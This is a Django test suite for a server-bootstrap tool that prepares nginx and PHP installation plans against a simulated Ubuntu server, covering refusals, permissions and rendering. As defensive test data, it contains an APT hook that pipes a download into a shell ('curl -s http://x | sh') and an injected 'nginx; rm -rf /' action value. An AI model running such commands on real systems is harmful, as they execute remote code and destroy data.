"""The request-to-worker-to-plan-to-rendered-review workflow for plan preparation.

Real views, services, the lifecycle, the ``db_worker`` command, persistence and rendering
run; only remote execution is substituted, with a simulated Ubuntu 26.04 server answering
at ``discovery.ssh.connect``.
"""

import re
from datetime import timedelta
from typing import override
from unittest import mock

from django.contrib.auth.models import Permission
from django.test import Client
from django.utils import timezone

from discovery.fakes import HOST_KEY, STALE, record_attempt
from discovery.models import DiscoveryAttempt
from discovery.services import request_discovery
from discovery.ssh import CommandResult
from operations.models import RemoteOperation
from servers.testing import HTMX_FRAGMENT

from . import inspection
from .fakes import (
    BOOT_ID,
    NGINX_VERSION,
    PHP_VERSION,
    PLAN_PERMISSIONS,
    UPTIME_CENTISECONDS,
    WILDCARDS,
    PreparationTestCase,
)
from .models import (
    ADMISSION_CENTISECONDS,
    ConfigurationPlan,
    PackageTransition,
    PlanEffect,
    PlanEvidence,
    PlanPreparation,
    PlanRefusal,
    PlanRootPackage,
    Privilege,
)
from .plan_testing import kept_text
from .services import INTERRUPTED_FAILURE, REVOKED_FAILURE

Reason = PlanRefusal.Reason
Effect = PlanEffect.Kind
# Evidence only site plans read (sites.admission).
# Evidence only site and database plans record.
SITE_EVIDENCE = frozenset(
    {
        "site_revalidation",
        "nginx_closure",
        "fpm_closure",
        "accounts",
        "allocation",
        "site_paths",
        "catalog",
        "catalog_revalidation",
        "catalog_after",
        "driver",
        "renewal_revalidation",
        "external_reads",
        "lineage_revalidation",
        "readiness_recheck",
        "wpcli_revalidation",
        "wordpress_files",
        "wordpress_database",
        "wordpress_runtime",
        "wordpress_state",
    }
)
Status = RemoteOperation.Status


def names_release(text: str, release: str) -> bool:
    """Whether ``text`` names ``release``, such as ``8.5`` in ``php8.5-fpm``.

    Digits inside a longer number, such as a timestamp's ``58.312744`` seconds, do not.
    """
    return re.search(rf"(?<![\d.]){re.escape(release)}(?!\d)", text) is not None


class PreparationWorkflowTests(PreparationTestCase):
    def test_a_request_queues_work_that_the_worker_turns_into_a_reviewed_plan(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.ubuntu.answer(self.remote)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}
        )
        self.assertRedirects(response, f"/servers/{self.server.pk}/setup/#plans")
        preparation = PlanPreparation.objects.get()
        # The request only queued the work; nothing connected during it.
        self.assertEqual(preparation.status, Status.QUEUED)
        self.assertEqual(preparation.kind, RemoteOperation.Kind.PLAN_PREPARATION)
        self.assertEqual(preparation.requested_by, self.user)
        self.assertEqual(self.remote.targets, [])
        page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertContains(page, "Preparation queued")
        pending = self.client.get(f"/plans/{preparation.pk}/")
        self.assertContains(pending, f"/servers/{self.server.pk}/setup/#plans")
        self.assertContains(page, 'hx-trigger="every 2s"')

        self.run_worker()

        preparation.refresh_from_db()
        self.assertEqual(preparation.status, Status.SUCCEEDED)
        self.assertEqual(preparation.host_key, HOST_KEY)
        plan = ConfigurationPlan.objects.get()
        self.assertTrue(plan.eligible)
        self.assertFalse(plan.no_changes)
        self.assertEqual(
            (plan.action, plan.ssh_alias, plan.host_key, plan.boot_id, plan.privilege),
            ("nginx", "web.example.com", HOST_KEY, BOOT_ID, Privilege.SUDO),
        )
        self.assertEqual(plan.uptime_centiseconds, UPTIME_CENTISECONDS)
        self.assertEqual(
            plan.admission_deadline_centiseconds, UPTIME_CENTISECONDS + ADMISSION_CENTISECONDS
        )
        self.assertEqual(plan.admission_expires_at - plan.collected_at, timedelta(minutes=15))
        self.assertEqual(
            (plan.os_name, plan.architecture, plan.apt_version),
            ("Ubuntu 26.04.1 LTS", "amd64", "3.2.0"),
        )
        self.assertEqual(
            list(plan.roots.values_list("name", "version", "installed")),
            [("nginx", NGINX_VERSION, False)],
        )
        installs = plan.transitions.filter(step=PackageTransition.Step.INSTALL)
        self.assertEqual(
            list(installs.values_list("package", "version", "architecture")),
            [
                ("nginx-common", NGINX_VERSION, "all"),
                ("nginx", NGINX_VERSION, "amd64"),
            ],
        )
        self.assertEqual(plan.transitions.filter(step="configure").count(), 2)
        self.assertEqual(
            installs.get(package="nginx").origins,
            "Ubuntu:26.04/resolute-updates\nUbuntu:26.04/resolute-security",
        )
        self.assertEqual(
            list(plan.effects.values_list("kind", flat=True)),
            [
                Effect.PACKAGES,
                Effect.PACKAGE_GUARD,
                Effect.MAINTAINER_START,
                Effect.HTTP_LISTENER,
                Effect.NEEDRESTART,
                Effect.NO_ROLLBACK,
            ],
        )
        self.assertIn("nginx -t accepts the configuration.", kept_text(plan))
        kinds = set(plan.evidence.values_list("kind", flat=True))
        # Every kind of package evidence; the retained units only a cleanup reads, and data
        # paths and administration only a database profile has.
        self.assertEqual(
            kinds,
            set(PlanEvidence.Kind.values)
            - {PlanEvidence.Kind.RETAINED_UNITS}
            - {PlanEvidence.Kind.ADMINISTRATION, PlanEvidence.Kind.DATA_PATHS}
            - {PlanEvidence.Kind.PHP_SOURCE_REVALIDATION}
            - {kind for kind in PlanEvidence.Kind.values if kind in SITE_EVIDENCE},
        )
        self.assertFalse(plan.refusals.exists())

        page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertContains(page, "Ready for review")
        self.assertContains(page, "Latest plan: Nginx profile")
        self.assertContains(page, f"<code>{BOOT_ID}</code>", html=True)
        self.assertContains(page, "port 80 on every IPv4 and IPv6 address")
        self.assertContains(page, "maintainer scripts enable and start nginx.service")
        self.assertContains(page, "Barectl does not roll back")
        self.assertContains(page, "15 minutes after collection on the server's monotonic clock")
        self.assertContains(page, f"<code>{NGINX_VERSION}</code>", html=True)
        self.assertNotContains(page, 'hx-trigger="every 2s"')
        # Applying starts only from the plan's own page.
        self.assertNotContains(page, ">Apply")
        plan_page = self.client.get(f"/plans/{preparation.pk}/")
        self.assertContains(plan_page, "Nginx profile plan")
        self.assertContains(plan_page, "Every check passed")

    def test_preparation_only_reads_and_never_escalates_beyond_its_listed_reads(self) -> None:
        self.plan("nginx")
        self.assertTrue(self.remote.commands)
        # Every test checks each command against PREPARATION_READ_ONLY; these never run.
        for command in self.remote.commands:
            self.assertNotIn("apt-get update", command)
            self.assertNotRegex(command, r"apt-get (?!-s|indextargets)")
            self.assertNotRegex(command, r"systemctl (?!show )")
            if command.startswith("sudo "):
                self.assertRegex(command, r"\Asudo -n (-l |/usr/bin/ss -Hltnp )")

    def test_plans_keep_no_configuration_output_or_credentials(self) -> None:
        plan = self.plan("nginx")
        kept = kept_text(plan)
        # The fake's APT configuration includes a proxy password.
        self.assertNotIn("hunter2", kept)
        self.assertNotIn("proxyuser", kept)
        self.assertNotIn("dpkg-preconfigure", kept)
        page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertNotContains(page, "hunter2")

    def test_a_satisfied_profile_is_a_plan_without_changes(self) -> None:
        self.ubuntu.nginx = "installed"
        plan = self.plan("nginx")
        self.assertTrue(plan.eligible)
        self.assertTrue(plan.no_changes)
        self.assertEqual(
            list(plan.roots.values_list("name", "version", "installed")),
            [("nginx", NGINX_VERSION, True)],
        )
        self.assertFalse(plan.transitions.exists())
        self.assertEqual(list(plan.effects.values_list("kind", flat=True)), [Effect.NO_CHANGES])
        # Newer archive versions are never considered: nothing simulates an installation.
        self.assertFalse(any("apt-get -s" in command for command in self.remote.commands))
        self.assertContains(
            self.client.get(f"/servers/{self.server.pk}/advanced/"), "No changes needed"
        )

    def test_only_an_expired_ubuntu_release_blocks_an_installation(self) -> None:
        # A Release file still valid on the server's clock is current evidence.
        self.ubuntu.valid_until = "Wed, 30 Sep 2026 12:00:00 UTC"
        self.assertTrue(self.plan("nginx").eligible)
        # Expired by the server's clock: installing is refused until metadata is refreshed.
        self.ubuntu.valid_until = "Tue, 29 Sep 2026 11:59:00 UTC"
        plan = self.plan("nginx")
        self.assertEqual(set(self.reasons(plan)), {Reason.PACKAGE_METADATA})
        self.assertIn(
            "The Ubuntu Release file for resolute-updates expired at 2026-09-29 11:59 UTC",
            " ".join(plan.refusals.values_list("text", flat=True)),
        )
        # A satisfied profile installs nothing, and a refresh replaces the Release files.
        self.assertTrue(self.plan("metadata_refresh").eligible)
        self.ubuntu.nginx = "installed"
        self.assertTrue(self.plan("nginx").no_changes)

    def test_a_stopped_disabled_profile_proposes_explicit_enable_and_start(self) -> None:
        self.ubuntu.php = "installed"
        self.ubuntu.php_active = "inactive"
        self.ubuntu.php_enabled = "disabled"
        plan = self.plan("php")
        self.assertTrue(plan.eligible)
        self.assertFalse(plan.no_changes)
        self.assertFalse(plan.transitions.exists())
        self.assertEqual(
            list(plan.effects.values_list("kind", flat=True)),
            [Effect.SERVICE_ENABLE, Effect.SERVICE_START, Effect.LOCAL_SOCKET],
        )
        self.assertIn("php8.5-fpm.service is enabled and active.", kept_text(plan))

    def test_php_is_prepared_independently_of_nginx(self) -> None:
        plan = self.plan("php")
        self.assertTrue(plan.eligible, self.reasons(plan))
        self.assertEqual(
            list(plan.roots.values_list("name", "version", "installed")),
            [("php8.5-fpm", PHP_VERSION, False), ("php8.5-cli", PHP_VERSION, False)],
        )
        self.assertIn("opens no network port", kept_text(plan))
        self.assertFalse(any("nginx" in command for command in self.remote.commands))

    def test_a_partial_php_baseline_installs_only_the_missing_root(self) -> None:
        self.ubuntu.php = "installed"
        self.ubuntu.php_cli_only = True
        self.ubuntu.automatic = (*self.ubuntu.automatic, "php8.5-cli")
        plan = self.plan("php")
        self.assertTrue(plan.eligible, self.reasons(plan))
        self.assertEqual(
            list(plan.roots.values_list("name", "version", "installed")),
            [("php8.5-fpm", PHP_VERSION, False), ("php8.5-cli", PHP_VERSION, True)],
        )
        self.assertEqual(set(plan.transitions.values_list("package", flat=True)), {"php8.5-fpm"})
        self.assertIn(inspection.simulate(["php8.5-fpm"]), self.remote.commands)
        self.assertIn("The default www pool listens on /run/php/php8.5-fpm.sock.", kept_text(plan))

    def test_a_metadata_refresh_plan_has_its_own_evidence_and_no_transitions(self) -> None:
        plan = self.plan("metadata_refresh")
        self.assertTrue(plan.eligible)
        self.assertFalse(plan.roots.exists())
        self.assertFalse(plan.transitions.exists())
        self.assertEqual(
            list(plan.effects.values_list("kind", flat=True)),
            [
                Effect.INDEX_UPDATE,
                Effect.UPDATE_HOOKS,
                Effect.INVALIDATES_PLANS,
                Effect.NO_ROLLBACK,
            ],
        )
        self.assertEqual(
            set(plan.evidence.values_list("kind", flat=True)),
            {
                PlanEvidence.Kind.PLATFORM,
                PlanEvidence.Kind.PRIVILEGE,
                PlanEvidence.Kind.APT_CONFIGURATION,
                PlanEvidence.Kind.APT_HOOKS,
                PlanEvidence.Kind.APT_SOURCES,
                PlanEvidence.Kind.APT_PREFERENCES,
                PlanEvidence.Kind.PACKAGE_INDEXES,
                PlanEvidence.Kind.APT_REVALIDATION,
            },
        )
        # The digest the apply payload recomputes on the server is kept as read.
        self.assertEqual(
            plan.evidence.get(kind=PlanEvidence.Kind.APT_REVALIDATION).fingerprint,
            self.ubuntu.apt_digest(),
        )
        text = kept_text(plan)
        self.assertIn("http://archive.ubuntu.com/ubuntu", text)
        self.assertIn("command-not-found rebuilds the command-not-found database", text)
        # The hooks Ubuntu's server cloud image adds are admitted and disclosed too.
        self.assertIn("appstream refreshes the AppStream catalog", text)
        self.assertIn("packagekit tells PackageKit", text)
        # Preview never refreshes metadata, and a refresh plan reads no package states.
        self.assertFalse(
            any("dpkg-query -W -f='${Package}\\t${Arch" in c for c in self.remote.commands)
        )

    def test_unsupported_or_unsafe_evidence_is_refused_with_reasons(self) -> None:
        masked = (
            "Id=nginx.service\nLoadState=masked\nActiveState=inactive\nSubState=dead\n"
            "FragmentPath=/etc/systemd/system/nginx.service\nDropInPaths=\nUnitFileState=masked\n"
        )
        removal = (
            "0 upgraded, 1 newly installed, 1 to remove and 0 not upgraded.\n"
            "Remv apache2 [2.4.66-2ubuntu2.5]\n"
            f"Inst nginx ({NGINX_VERSION} Ubuntu:26.04/resolute-updates [amd64])\n"
            f"Conf nginx ({NGINX_VERSION} Ubuntu:26.04/resolute-updates [amd64])\n"
        )
        cases: list[tuple[str, str, dict[str, object], PlanRefusal.Reason]] = [
            (
                "upgrade",
                "nginx",
                {"upgrades": (("libc6", "2.43-2ubuntu2.4", "2.43-2ubuntu2.5"),)},
                Reason.INSTALLED_PACKAGE_CHANGE,
            ),
            ("removal", "nginx", {"simulation_text": removal}, Reason.INSTALLED_PACKAGE_CHANGE),
            ("hold", "nginx", {"holds": ("nginx-common",)}, Reason.HELD_PACKAGE),
            (
                "unknown hook",
                "nginx",
                {"hooks": [("DPkg::Post-Invoke::", "curl -s http://x | sh")]},
                Reason.APT_HOOK,
            ),
            (
                "unknown hook",
                "metadata_refresh",
                {"hooks": [("APT::Update::Post-Invoke::", "touch /tmp/x")]},
                Reason.APT_HOOK,
            ),
            (
                "other archive",
                "nginx",
                {"nginx_origins": "LP-PPA-ondrej-nginx:26.04/resolute"},
                Reason.PACKAGE_SOURCE,
            ),
            (
                "trusted source",
                "metadata_refresh",
                {"source_overrides": ("/etc/apt/sources.list.d/extra.list",)},
                Reason.PACKAGE_SOURCE,
            ),
            ("missing index", "nginx", {"suites": ("resolute",)}, Reason.PACKAGE_METADATA),
            ("unauthenticated index", "php", {"trusted": False}, Reason.PACKAGE_METADATA),
            (
                "expired Release file",
                "nginx",
                {"valid_until": "Mon, 28 Sep 2026 12:00:00 UTC"},
                Reason.PACKAGE_METADATA,
            ),
            (
                "unreadable Release validity",
                "nginx",
                {"valid_until": "yesterday"},
                Reason.INCOMPLETE,
            ),
            (
                "pending dpkg",
                "nginx",
                {"audit": "The following packages are only half configured"},
                Reason.PACKAGE_HEALTH,
            ),
            (
                # dpkg refuses an unprivileged audit while an interrupted change is unfinished.
                "unfinished dpkg records",
                "php",
                {"extra": {inspection.DPKG_AUDIT: CommandResult(2, "")}},
                Reason.INCOMPLETE,
            ),
            ("leftover", "nginx", {"nginx": "leftover"}, Reason.LEFTOVER),
            (
                "extra site",
                "nginx",
                {
                    "nginx": "installed",
                    "extra_files": {"/etc/nginx/sites-available/shop": "1" * 32},
                },
                Reason.CUSTOMIZED,
            ),
            (
                "changed conffile",
                "nginx",
                {"nginx": "installed", "changed_conffiles": ("/etc/nginx/nginx.conf",)},
                Reason.CUSTOMIZED,
            ),
            (
                "extra pool",
                "php",
                {
                    "php": "installed",
                    "extra_files": {"/etc/php/8.5/fpm/pool.d/shop.conf": "2" * 32},
                },
                Reason.CUSTOMIZED,
            ),
            (
                "unit override",
                "nginx",
                {
                    "nginx": "installed",
                    "unit_drop_ins": "/etc/systemd/system/nginx.service.d/override.conf",
                },
                Reason.SERVICE_UNIT,
            ),
            (
                "failed unit",
                "php",
                {"php": "installed", "php_active": "failed"},
                Reason.SERVICE_UNIT,
            ),
            (
                "masked unit",
                "nginx",
                {"extra": {inspection.unit_state("nginx.service"): CommandResult(0, masked)}},
                Reason.SERVICE_UNIT,
            ),
            ("listener", "nginx", {"other_listeners": WILDCARDS[:1]}, Reason.LISTENER),
            ("socket listener", "php", {"socket_listener": True}, Reason.LISTENER),
            (
                "silent pool",
                "php",
                {
                    "php": "installed",
                    "extra": {
                        inspection.socket_listeners("/run/php/php8.5-fpm.sock"): CommandResult(
                            0, ""
                        )
                    },
                },
                Reason.LISTENER,
            ),
            (
                "other release",
                "php",
                {"php_releases": (("php8.2-fpm", "8.2.28-1", "ii"),)},
                Reason.UNSUPPORTED_VERSION,
            ),
            (
                "other release left",
                "php",
                {"php": "installed", "php_releases": (("php8.1-common", "8.1.2-1", "rc"),)},
                Reason.UNSUPPORTED_VERSION,
            ),
            (
                "other release directory",
                "php",
                {"php_entries": ("8.2",)},
                Reason.UNSUPPORTED_VERSION,
            ),
            ("privilege", "nginx", {"privilege": "none"}, Reason.PRIVILEGE),
            ("malformed", "nginx", {"simulation_text": "Inst nginx (garbage\n"}, Reason.INCOMPLETE),
            (
                "truncated",
                "nginx",
                {"extra": {inspection.APT_CONFIG: CommandResult(0, "", truncated=True)}},
                Reason.INCOMPLETE,
            ),
            (
                "denied",
                "php",
                {"extra": {inspection.DPKG_AUDIT: CommandResult(126, "")}},
                Reason.INCOMPLETE,
            ),
            (
                "platform",
                "nginx",
                {
                    "extra": {
                        inspection.OS_RELEASE: CommandResult(0, 'ID=debian\nVERSION_ID="12"\n')
                    }
                },
                Reason.UNSUPPORTED_PLATFORM,
            ),
        ]
        for name, action, changes, reason in cases:
            with self.subTest(case=name, action=action):
                self.fresh_server()
                for attribute, value in changes.items():
                    setattr(self.ubuntu, attribute, value)
                plan = self.plan(action)
                self.assertFalse(plan.eligible)
                self.assertIn(reason, self.reasons(plan))
                if reason == Reason.UNSUPPORTED_PLATFORM:
                    # The platform leads the refusals it causes.
                    self.assertEqual(self.reasons(plan)[0], reason)
                self.assertFalse(plan.effects.exists())
                self.assertFalse(plan.postconditions.exists())
                page = self.client.get(f"/servers/{self.server.pk}/advanced/")
                self.assertContains(page, "Refused: this plan cannot be applied")
                self.assertContains(page, PlanRefusal.Reason(reason).label)
                self.assertContains(page, "Barectl changed nothing on the server")

    def test_customized_configuration_is_named_without_its_contents(self) -> None:
        self.ubuntu.nginx = "installed"
        self.ubuntu.extra_files = {"/etc/nginx/sites-available/shop": "1" * 32}
        plan = self.plan("nginx")
        (refusal,) = plan.refusals.all()
        self.assertEqual(refusal.reason, Reason.CUSTOMIZED)
        self.assertIn(
            "/etc/nginx/sites-available/shop (not part of the distribution's", refusal.text
        )
        self.assertIn("Bootstrap does not adopt or overwrite custom configuration.", refusal.text)

    def test_a_connection_failure_fails_the_preparation_without_a_plan(self) -> None:
        self.remote.failure = "The controller host does not trust the host key presented."
        preparation = self.prepare("nginx")
        self.assertEqual(preparation.status, Status.FAILED)
        self.assertIn("does not trust the host key", preparation.failure)
        self.assertFalse(ConfigurationPlan.objects.exists())
        page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertContains(page, "Preparation failed")
        self.assertContains(page, "does not trust the host key")

    def test_the_account_is_revalidated_before_the_worker_connects(self) -> None:
        user = type(self.user)

        def remove_permission() -> None:
            self.user.user_permissions.remove(
                Permission.objects.get(codename="prepare_configurationplan")
            )

        def deactivate() -> None:
            user.objects.filter(pk=self.user.pk).update(is_active=False)

        revocations = {"permission": remove_permission, "deactivation": deactivate}
        for name, revoke in revocations.items():
            with self.subTest(revocation=name):
                self.fresh_server()
                user.objects.filter(pk=self.user.pk).update(is_active=True)
                self.sign_in_with(*PLAN_PERMISSIONS)
                self.ubuntu.answer(self.remote)
                self.remote.targets.clear()
                self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
                revoke()
                self.run_worker()
                preparation = PlanPreparation.objects.get()
                self.assertEqual(preparation.status, Status.FAILED)
                self.assertEqual(preparation.failure, REVOKED_FAILURE)
                self.assertEqual(self.remote.targets, [])

    def test_plans_are_immutable(self) -> None:
        plan = self.plan("nginx")
        with self.assertRaises(ValueError):
            plan.save()
        root = plan.roots.get()
        root.version = "9.9"
        with self.assertRaises(ValueError):
            root.save()
        with self.assertRaises(ValueError):
            PlanRootPackage(plan=plan, name="x", version="1", installed=False).save(
                force_update=True
            )

    def test_an_expired_plan_asks_for_a_new_preparation(self) -> None:
        plan = self.plan("nginx")
        later = plan.admission_expires_at + timedelta(seconds=1)
        with mock.patch("bootstrap.presentation.timezone.now", return_value=later):
            page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertContains(page, "admission deadline has passed")
        self.assertContains(page, "(expired)")
        self.assertNotContains(page, "Every check passed")

    def test_a_plan_keeps_the_alias_it_was_prepared_with(self) -> None:
        first = self.plan("nginx")
        self.sign_in_with("view_server", "change_server")
        self.client.post(
            f"/servers/{self.server.pk}/edit/", {"name": "Web", "ssh_alias": "stage.example.net"}
        )
        self.run_worker()
        second = self.plan("nginx")
        self.assertEqual(first.ssh_alias, "web.example.com")
        self.assertEqual(second.ssh_alias, "stage.example.net")
        self.assertEqual(
            [target.alias for target in self.remote.targets],
            ["web.example.com", "stage.example.net", "stage.example.net"],
        )
        page = self.client.get(f"/plans/{first.pk}/")
        self.assertContains(page, "<code>web.example.com</code>", html=True)

    def test_the_alias_cannot_change_while_a_preparation_is_active(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS, "change_server")
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
        response = self.client.post(
            f"/servers/{self.server.pk}/edit/", {"name": "Web", "ssh_alias": "stage.example.net"}
        )
        self.assertContains(response, "Change it after the operation finishes.")
        self.server.refresh_from_db()
        self.assertEqual(self.server.ssh_alias, "web.example.com")

    def test_an_abandoned_preparation_is_recovered_as_interrupted(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
        preparation = record_attempt(PlanPreparation.objects.get(), Status.RUNNING, age=STALE)
        page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        preparation.refresh_from_db()
        self.assertEqual(preparation.status, Status.FAILED)
        self.assertEqual(preparation.failure, INTERRUPTED_FAILURE)
        self.assertContains(page, "Preparation failed")
        self.assertContains(page, "Prepare plan")

    def test_removal_deletes_plans_and_waits_for_an_active_preparation(self) -> None:
        self.plan("nginx")
        self.sign_in_with(*PLAN_PERMISSIONS, "delete_server")
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "php"})
        page = self.client.get(f"/servers/{self.server.pk}/remove/")
        self.assertContains(page, "Remote operation in progress")
        refused = self.client.post(f"/servers/{self.server.pk}/remove/", {"confirm": "remove"})
        self.assertEqual(refused.status_code, 409)
        self.run_worker()
        page = self.client.get(f"/servers/{self.server.pk}/remove/")
        self.assertContains(page, "every plan preparation recorded for it with its plan")
        self.assertContains(page, "2 plan preparations of the kinds you can view")
        self.client.post(f"/servers/{self.server.pk}/remove/", {"confirm": "remove"})
        self.assertFalse(RemoteOperation.objects.exists())
        self.assertFalse(ConfigurationPlan.objects.exists())


class ActiveOperationTests(PreparationTestCase):
    """Discovery and plan preparation share one active remote operation per server."""

    def test_a_connection_check_blocks_preparation(self) -> None:
        request_discovery(self.server)
        self.sign_in_with(*PLAN_PERMISSIONS)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}, follow=True
        )
        self.assertContains(response, "Barectl is running another remote operation")
        self.assertFalse(PlanPreparation.objects.exists())
        page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertNotContains(page, "Prepare plan")
        self.assertContains(page, "such as a connection check. A plan can be prepared after")
        self.run_worker()
        self.assertContains(self.client.get(f"/servers/{self.server.pk}/advanced/"), "Prepare plan")

    def test_a_preparation_blocks_a_connection_check(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS, "add_discoveryattempt")
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
        self.client.post(f"/servers/{self.server.pk}/verify/")
        self.assertFalse(DiscoveryAttempt.objects.exists())
        page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertContains(page, "Barectl is running another remote operation for this server.")
        self.assertNotContains(page, "Verify connection</button>")
        # The plan, discovery and WordPress sections poll until the operation finishes.
        self.assertContains(page, 'hx-trigger="every 2s"', count=3)
        self.ubuntu.answer(self.remote)
        self.run_worker()
        page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertContains(page, "Verify connection</button>")
        self.assertNotContains(page, 'hx-trigger="every 2s"')

    def test_a_reconciling_operation_occupies_the_active_slot(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
        RemoteOperation.objects.update(status=Status.RECONCILING)
        self.client.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "php"})
        self.assertEqual(PlanPreparation.objects.count(), 1)
        self.assertEqual(request_discovery(self.server).status, Status.RECONCILING)
        # Recovery never fails a reconciling operation, however old.
        RemoteOperation.objects.update(started_at=timezone.now() - STALE)
        self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertEqual(RemoteOperation.objects.get().status, Status.RECONCILING)


class PlanAccessTests(PreparationTestCase):
    @override
    def setUp(self) -> None:
        super().setUp()
        self.preparation = self.prepare("nginx")
        self.client.logout()
        self.user.user_permissions.clear()

    def test_signed_out_requests_are_sent_to_sign_in(self) -> None:
        for url in (
            f"/servers/{self.server.pk}/plans/",
            f"/plans/{self.preparation.pk}/",
        ):
            with self.subTest(url=url):
                response = self.client.get(url)
                self.assertRedirects(response, f"/accounts/login/?next={url}")
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}
        )
        self.assertEqual(response.status_code, 302)
        self.assertEqual(PlanPreparation.objects.count(), 1)

    def test_inventory_access_alone_never_shows_plans_or_their_audit(self) -> None:
        record_attempt(self.server, Status.SUCCEEDED)
        self.sign_in_with("view_server", "add_discoveryattempt", "delete_server")
        page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertEqual(page.status_code, 200)
        self.assertNotContains(page, "Bootstrap plans")
        self.assertNotContains(page, BOOT_ID)
        for url in (f"/servers/{self.server.pk}/plans/", f"/plans/{self.preparation.pk}/"):
            with self.subTest(url=url):
                self.assertEqual(self.client.get(url, headers=HTMX_FRAGMENT).status_code, 403)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}
        )
        self.assertEqual(response.status_code, 403)
        activity = self.client.get("/activity/")
        self.assertContains(activity, "Discovery attempts across all servers")
        self.assertNotContains(activity, "Plan preparation")
        self.assertNotContains(activity, "Review plan")
        removal = self.client.get(f"/servers/{self.server.pk}/remove/")
        self.assertNotContains(removal, "plan preparation")

    def test_reviewers_see_plans_but_cannot_prepare_them(self) -> None:
        self.sign_in_with("view_server", "view_configurationplan", "apply_configurationplan")
        page = self.client.get(f"/servers/{self.server.pk}/advanced/")
        self.assertContains(page, "Bootstrap plans")
        self.assertContains(page, "Ready for review")
        self.assertNotContains(page, "Prepare plan")
        # Applying starts only from the plan's own page, whatever the account may do.
        self.assertNotContains(page, ">Apply")
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}
        )
        self.assertEqual(response.status_code, 403)
        self.assertEqual(PlanPreparation.objects.count(), 1)

    def test_preparation_requires_csrf_and_post(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.assertEqual(
            self.client.get(f"/servers/{self.server.pk}/plans/prepare/").status_code, 405
        )
        checked = Client(enforce_csrf_checks=True)
        checked.force_login(self.user)
        response = checked.post(f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"})
        self.assertEqual(response.status_code, 403)
        self.assertEqual(PlanPreparation.objects.count(), 1)

    def test_only_supported_actions_can_be_prepared(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        for value in ("", "apache2", "nginx; rm -rf /", "apply"):
            with self.subTest(action=value):
                response = self.client.post(
                    f"/servers/{self.server.pk}/plans/prepare/",
                    {"action": value},
                    headers=HTMX_FRAGMENT,
                )
                self.assertEqual(response.status_code, 422)
                self.assertContains(response, "usa-error-message", status_code=422)
                self.assertEqual(PlanPreparation.objects.count(), 1)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "apache2"}, follow=True
        )
        self.assertContains(response, "Choose one of the supported profiles or actions.")

    def test_invalid_php_selection_errors_are_associated_with_the_selects(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/",
            {"action": "php", "php_version": "8.2", "php_supply": "other"},
            headers=HTMX_FRAGMENT,
        )
        self.assertEqual(response.status_code, 422)
        for name in ("php_version", "php_supply"):
            self.assertContains(response, f'id="id_{name}_error"', status_code=422)
            self.assertContains(response, f'aria-describedby="id_{name}_error"', status_code=422)
        self.assertContains(response, "usa-select usa-input--error", status_code=422)

    def test_unknown_servers_and_plans_are_not_found(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.assertEqual(self.client.get("/plans/999/").status_code, 404)
        response = self.client.post("/servers/999/plans/prepare/", {"action": "nginx"})
        self.assertEqual(response.status_code, 404)


class PlanFragmentTests(PreparationTestCase):
    def test_htmx_preparation_returns_a_polling_fragment_and_announces_changes(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        self.ubuntu.answer(self.remote)
        response = self.client.post(
            f"/servers/{self.server.pk}/plans/prepare/", {"action": "nginx"}, headers=HTMX_FRAGMENT
        )
        content = response.content.decode()
        self.assertIn('id="plans"', content)
        self.assertIn('hx-trigger="every 2s"', content)
        # The removed form cannot keep focus; the section heading takes it.
        self.assertIn('id="plans-heading" tabindex="-1" autofocus', content)
        self.assertIn('hx-target="#plans-announcement"', content)
        self.assertIn("Plan preparation queued.", content)
        self.assertNotIn("<html", content)
        token = content.split("?shown=")[1].split('"')[0]
        unchanged = self.client.get(
            f"/servers/{self.server.pk}/plans/?shown={token}", headers=HTMX_FRAGMENT
        )
        self.assertNotContains(unchanged, "plans-announcement")
        self.run_worker()
        ready = self.client.get(
            f"/servers/{self.server.pk}/plans/?shown={token}", headers=HTMX_FRAGMENT
        )
        self.assertContains(ready, "The plan is ready for review.")
        self.assertNotContains(ready, 'hx-trigger="every 2s"')
        self.assertNotContains(ready, "autofocus")

    def test_full_page_requests_for_the_fragment_go_to_the_server_page(self) -> None:
        self.sign_in_with(*PLAN_PERMISSIONS)
        response = self.client.get(f"/servers/{self.server.pk}/plans/")
        self.assertRedirects(response, f"/servers/{self.server.pk}/setup/")


class PlanActivityTests(PreparationTestCase):
    def test_activity_lists_preparations_beside_attempts_for_plan_reviewers(self) -> None:
